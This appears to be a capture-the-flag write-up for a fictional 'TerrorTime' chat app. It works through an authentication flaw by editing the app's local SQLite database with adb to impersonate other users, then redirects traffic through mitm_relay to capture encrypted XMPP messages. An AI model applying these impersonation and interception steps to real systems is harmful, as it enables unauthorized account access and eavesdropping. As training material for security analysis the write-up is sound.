# Task 5 - Masquerade - (Vulnerability Analysis)

*The app uses a bespoke application of the OAUTH protocol to authorize and authenticate TerrorTime users to the chat service. Our intelligence indicates that individual terrorists are provided phones with TerrorTime installed and pre-registered to them. They simply need to enter their username and secret PIN to access the chat service, which uses OAUTH behind the scenes to generate a unique token that is used for authentication. This is a non-standard way of using the protocol, but they believe it to be superior to normal password-based authentication since a unique token is used per login vs. a static password. Whether that is indeed the case is up to you to analyze and assess for possible vulnerabilities. Our forensics team recovered a deleted file from the terrorist's hard drive that may aid in your analysis.*

*Through other intelligence means, we know that the arrested terrorist is a member of one of many cells in a larger organization. He has shown no signs of someone who is acting in a leadership role -- he simply carries out orders given to him from his cell leader, who is likely relaying information from the top-level organizational leader. To uncover information from the cell leader’s conversations, we need access to their account. The messages are end-to-end encrypted, so without the leader's private key we won't be able to decrypt his messages, but we may be able to learn more about the members of the cell and the organization's structure. Analyze the client and server-side components of the authentication process and find a way to masquerade as arbitrary users without knowing their credentials. Take advantage of this vulnerability and masquerade as the cell leader. Access and review the cell leader’s relevant information stored on the server. Use this information to identify and submit the top-level organizational leader’s username and go a step further and submit a copy of the last (still encrypted) message body from the organization leader’s chat history. It’s suggested to complete task 4 before attempting this task as task 4 aids in discovering the cell leader’s identity.*


*Downloads:*

* *Authentication Program (auth_verify.pyc)*

## Solution

For this task, we need to find a vulnerability that will allow us to masquerade as Gittel in order to identify the top-level organizational leader and find their most recent sent encrypted message.

To begin, we will decompile the provided Python bytecode back into Python using an [online tool](https://python-decompiler.com). The code appears to be a testing script that verifies OAuth2 access tokens using the `/introspect` endpoint. While this endpoint does not exist on the real server, we have a better idea of how the OAuth works.

In Ghidra, if we look at the `requestAccessToken` function, we see that it is performing similar actions as the Python script but it is getting a new token using an incomplete version of the [authorization code flow](https://auth0.com/docs/flows/concepts/auth-code). To use this flow, an application needs to send the server an encoded version of a client ID and client secret. If we want to masquerade as Gittel using this, we would need her client secret. However, without her cached credentials, this is impossible. We will have to figure out a vulnerability in the authorization logic using only Natalie's cached credentials.

Let's look at how the application logs a user in once they have a token. To do this, we look at what calls `getOAuth2AccessToken`. The relevant caller is `doInBackground` belonging to `XMPPLoginTask`. Now we can see how the application logs in to the chat server.

```java
ref_00 = TerrorTimeApplication.access$000(ref);
ref_01 = ref_00.getXmppUserName();
ppSVar2 = ref_01.split("@");
...
ref_00.validateAccessToken(pCVar3);
ref_02 = XMPPTCPConnectionConfiguration.builder();
...
ref_01 = ref_03.getEncryptPin();
pbVar4 = ref_00.getOAuth2AccessToken(ref_01);
ref_07 = new String(pbVar4);
ref_02.setUsernameAndPassword(ppSVar2[0],ref_07);
```

The application uses the new access token as the password but does not use the client ID as the username. Rather, it uses the first part of the XMPP username. This explains why Natalie's client ID is in two places in the database. Since we are able to manipulate the database, we can change the XMPP username to Gittel's username and masquerade as her.

```
$ adb shell

generic_x86:/ # cd /data/data/com.badguy.terrortime/databases
generic_x86:/data/data/com.badguy.terrortime/databases # sqlite3 clientDB.db
sqlite> UPDATE clients SET xname='gittel--vhost-32@terrortime.app';
```

If we log in now using Natalie's credentials, we are presented with Gittel's account instead! However, since the app is end-to-end encrypted, we are not able to view Gittel's chat history because we have Natalie's public and private keys in the database. For this task though, we only need to identify who the top-level organizational leader is.

We see she is talking to Alice and Natalie, who she is in charge of, but also Anjali, Isabelle, and Hannah. One of them is the top-level organizational leader and the other two must be other cell leaders. If we masquerade as the these three contacts using the same vulnerability, we can create a mapping of the conversations and reason what everyone's roles are.


```
Anjali
- Isabelle
- Gittel
- Greyson
- Hannah
- Elijah

Gittel
- Alice
- Natalie
- Anjali
- Isabelle
- Hannah

Isabelle
- Gittel
- Anjali
- Hannah
- Preston
- Keily

Hannah
- Isabelle
- Gittel
- Anjali
```

We can see that Hannah is the top-level organizational leader because she exclusively talks to the other three while they talk to each other and their subordinates as well. While we cannot see Hannah's chat history, her messages must still be coming to the device so we are able to intercept them.

Normally, a tool such as Burp Suite would be ideal but it cannot capture XMPP messages. For this, we will use [mitm_relay](https://github.com/jrmdev/mitm_relay) which will let us see encrypted XMPP messages. Since we have control of the XMPP server address using the database, we can set it to our [host machine](https://developer.android.com/studio/run/emulator-networking) running the MITM which will interact with the real XMPP server as normal.

```
sqlite> UPDATE clients SET xsip='10.0.2.2';
```

```
$ /usr/local/bin/python mitm_relay.py -l 0.0.0.0 -r tcp:443:chat.terrortime.app:443 -c server.pem -k private.key
[!] Client cert/key not provided.
[!] Interception disabled! mitm_relay will run in monitoring mode only.
[+] Relay listening on tcp 443 -> chat.terrortime.app:443
[+] New client: ('127.0.0.1', 49319) -> chat.terrortime.app:443
...
S >> C [ 54.91.5.130:443 >> 127.0.0.1:49319 ] [ Mon 23 Dec 17:04:50 ] [ 2086 ]  
<message to='hannah--vhost-32@terrortime.app/chat...</forwarded></result></message>
...
```

Hannah's full encrypted conversation history is displayed in the output in JSON encoded as HTML. Each message body is within `<body>` tags. Using the last section of the output, we can use an [online tool](https://codebeautify.org/html-decode-string) to decode back to plain JSON and we have the most recent encrypted message body.

```json
{
    "messageKey": {
        "uG2WefXBkmgF3uVHFnzWHUgA9XoGms348sGn/C9Aqqo=":"AyPsTTiuatk8h0hjF4IOLINa3pRBclyZe59qh1hp9A0HFZOJy706DELFK/f6upmi+wmOQ0GL/V5Uy2IW4lDLd1Bd+5KP8dVC6LYqS9BWrwGTIpKacANUj889nOX23XoT8x/OjYXS25C57v7qCxidGB0fz63FSaQVZ2gJd5a1OL6jTi2VfXov+QmFR2TsmIwxTPQXCdH4mHWgAfgjsJni022s41PHQeTlYrEo6hOGc9IrhCoPu+0mBMSnST4dN/wlr0yq9WVERpe40AApo0nRFSxL7vR5kRhfChaB6qFJBeQgR/283hDFOxpl5LkRMdnvJN1DUHEY4xAg1OD54IFyOA==",
        "Uyc9U2Er8+NjGHYDiYp+gwQog1pGW5hdQOyAkdzzeTc=":"TE+JJygk2Bk08nkoPc910Yk5Ai0sv9pvchSo/yMFB75GXcqr+KGF80hscfssgRpF9ntmgZ8N0p/cs5xdGnX2inPNEeZqyp26TJt/NHaGnHSnPwt0rKUs4k4HUqnFIyuFz0vWlSKYeKCoYwUa+jU6PUQAUrBGFn5S+R32SQXHtUbbI1BJpMVvUavZU8G7BASH5Hp09NVkryPM9KWRGp+XCPaR1qTC7SgrVhgG0vKM2eHXebA7pR+xzTIObXsxafj2AGTKvhKkBRrrIk6fO3KGwnSkpx7rB0pq30UM5H1I08k7BpvVDhviD92TS7JvgukZ1NEX3kwxES2qq1jDk2f2TQ=="
    },
    "messageSig":"ZF7FtwVWyniuuuD+lb7/ujP+QdBw1u2i2jsgyBpyggE=",
    "message": {
        "msg":"vO+dG1BlPW6frcVYxF425denko81KIDgbBqhsvXSU+SLH/Eo4CpX7mVEOXbqywC46UUqMpQFBwLxyySzP1BeBPiarWQNV5u15xk4I1DkLf21vJOHTKR2/HeivzgmLQ92RAaSYDLcEvFBEGf9I/i0aFb7QRblECNMuVXRwfv+EWxfuANElUTZ98RvrNE9KKUd0zRPJwyYlh5yS1Gga0JSvXbWxDacpmxxGJxVpKsDBD33UAA/WTvKcvXgGRdmWE6m6QoRDflVztcnyZK3ItYWvyhN29Py1/nFG92rN2zeBg37sLJYgUCyG76dm+DDX+ma",
        "iv":"qXPwjboi8GgJyxg6CceXeA=="
    }
}
```
